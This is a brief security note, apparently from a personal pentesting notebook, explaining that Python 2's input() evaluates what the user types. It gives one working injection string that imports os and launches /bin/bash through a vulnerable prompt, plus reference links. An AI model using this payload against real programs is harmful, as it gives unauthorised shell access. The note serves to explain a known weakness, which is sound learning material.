# python2-input-rce

**Author:** Julien Bongars\
**Date:** 2026-02-19 03:14:50
**Path:**

---

In Python 2, `input()` is `eval(raw_input())`. Python 3 `input()` returns a string.

If a script does:

```python
name = input("Enter your name: ")
```

```txt
Enter your name: __import__("os").system("/bin/bash")
```

## Resources

- [Python 2 — input](https://docs.python.org/2/library/functions.html#input) — evaluates the line
- [HackTricks — Python](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/index.html) — sandbox / eval notes
